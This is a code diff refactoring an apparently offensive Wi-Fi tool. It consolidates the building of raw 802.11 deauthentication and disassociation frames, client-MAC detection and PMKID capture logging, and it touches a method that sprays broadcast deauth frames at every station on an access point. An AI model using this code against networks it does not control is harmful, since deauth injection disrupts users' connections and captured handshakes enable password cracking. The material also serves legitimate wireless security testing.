@@ -12,6 +12,7 @@ from wifit3.errors import is_device_gone
 from wifit3.wlan.channels import scan_hop_order
 from wifit3.wlan.packet import (
     WlanFrameParser, Packet, BeaconPacket, EapolPacket, WepDataPacket, AssocRequestPacket,
+    is_group_mac,
 )
 from wifit3.wlan.packet_stats import PacketStats
 from wifit3.wlan.wep_store import WepCaptureStore
@@ -62,16 +63,6 @@ def _bssid_byte_diff(a: str, b: str) -> int:
     return sum(1 for x, y in zip(pa, pb) if x != y)
 
 
-def _is_group_mac(mac: str) -> bool:
-    """True for a group (multicast/broadcast) MAC — the I/G bit (LSB of the first octet) is
-    set. These are frame destinations (IPv6 ``33:33:…``, IPv4 ``01:00:5e:…``, broadcast
-    ``ff:…``), never client stations, whose NICs are always unicast (even first octet)."""
-    try:
-        return bool(int(mac.split(":", 1)[0], 16) & 1)
-    except (ValueError, IndexError):
-        return True   # unparseable → never treat as a client
-
-
 # SIFS + a 1 Mbps long-preamble ACK (µs) — the unicast-ACK NAV. Matches aireplay-ng's
 # hardcoded deauth duration (0x013A); our injectors default to 1 Mbps CCK, so this is the
 # time the addressed STA needs to ACK back.
@@ -85,8 +76,19 @@ def _deauth_nav_bytes(dest_mac: str) -> bytes:
     destination reserves the medium for the SIFS + ACK it returns. The chip does NOT fill
     this in for raw monitor-injected frames (mac80211 only computes NAV for its own managed
     TX, not ``IEEE80211_TX_CTL_INJECTED`` frames), so we set it in the frame ourselves."""
-    nav = 0 if _is_group_mac(dest_mac) else _DEAUTH_ACK_NAV_US
+    nav = 0 if is_group_mac(dest_mac) else _DEAUTH_ACK_NAV_US
     return nav.to_bytes(2, "little")
+
+
+def build_deauth(a1: bytes, a2: bytes, a3: bytes, reason: int, *,
+                 disassoc: bool = False, duration: bytes = b"\x00\x00") -> bytes:
+    """One 802.11 Deauth (default) / Disassoc MPDU (no FCS): FC + ``duration`` NAV + addr1/2/3
+    + seq (0, HW-filled) + reason. ``duration`` is the little-endian NAV bytes (0 for a
+    group-addressed / un-ACKed frame). Shared by the interface deauth path, PMKID's leaving
+    deauth, and WPS's client-leaving frame."""
+    subtype = 0x0A if disassoc else 0x0C          # Disassoc / Deauth (mgmt subtypes)
+    return (bytes([subtype << 4, 0x00]) + duration + a1 + a2 + a3
+            + b"\x00\x00" + reason.to_bytes(2, "little"))
 
 
 @dataclass
@@ -343,7 +345,7 @@ class WlanInterface:
             return False
         bssid = pkt.bssid
         rssi = pkt.rssi
-        client_mac = self._client_mac(pkt)
+        client_mac = pkt.client_mac
         if not client_mac or client_mac in self.forged_macs:
             return True
 
@@ -380,7 +382,7 @@ class WlanInterface:
         ap = self.access_points.get(bssid)
         if ap is None:
             return True
-        client_mac = self._client_mac(pkt)
+        client_mac = pkt.client_mac
         raw_frame = pkt.raw
         replay = pkt.replay_counter
         if not (client_mac and raw_frame and replay):
@@ -436,27 +438,6 @@ class WlanInterface:
             hs.pmkid = pmkid
             logger.info(f"[PMKID] {bssid} <-> {client_mac} captured {pmkid.hex()}")
         return True
-
-    @staticmethod
-    def _client_mac(pkt: Packet) -> Optional[str]:
-        """The client (non-AP) STA MAC in a frame, decided by the DS bits — or None when there
-        isn't one (WDS 4-address frames, or a group destination). An AP->client frame carries
-        the wired-side origin in addr3, so we key off direction; picking "the address that
-        isn't the BSSID" would mint phantom clients from the gateway/router MAC on a bridged
-        network. Group MACs (multicast/broadcast) are frame destinations, never stations."""
-        to_ds, from_ds = pkt.to_ds, pkt.from_ds
-        source, dest, bssid = pkt.source, pkt.dest, pkt.bssid
-        mac = None
-        if to_ds and not from_ds:        # client -> AP
-            mac = source
-        elif from_ds and not to_ds:      # AP -> client
-            mac = dest
-        elif not to_ds and not from_ds:  # mgmt / IBSS: the endpoint that isn't the AP
-            if source and source != bssid:
-                mac = source
-            elif dest and dest != bssid:
-                mac = dest
-        return mac if mac and not _is_group_mac(mac) else None
 
     def _decloak(self, ap: AccessPoint, ssid: str, method: str) -> None:
         """Learn a hidden AP's real SSID: tag how it was revealed on the first reveal, then
@@ -707,12 +688,10 @@ class WlanInterface:
         return self.current_channel
 
     def _deauth_frame(self, dest: bytes, src: bytes, ap_mac: bytes, dest_str: str) -> bytes:
-        """One 802.11 deauth MPDU (no FCS): FC 0xC0 (Deauth/Mgmt), reason 7 (class-3 frame
-        from a nonassociated STA). Addr1=dest, Addr2=src, Addr3=BSSID(AP). Duration/NAV is
-        keyed on the destination: unicast → the ACK NAV, group → 0 (see _deauth_nav_bytes).
-        The sequence number (0) is overwritten by the hardware."""
-        return (b"\xc0\x00" + _deauth_nav_bytes(dest_str) + dest + src + ap_mac
-                + b"\x00\x00" + b"\x07\x00")
+        """One 802.11 deauth MPDU addressed dest←src (BSSID=ap_mac), reason 7 (class-3 frame
+        from a nonassociated STA), with the destination-keyed ACK NAV (unicast → ACK NAV,
+        group → 0; see _deauth_nav_bytes)."""
+        return build_deauth(dest, src, ap_mac, 7, duration=_deauth_nav_bytes(dest_str))
 
     async def deauth_broadcast(self, ap_bssid: str, count: int = 20) -> int:
         """Spray AP→broadcast de-auth frames — one wave hits every associated station at once.
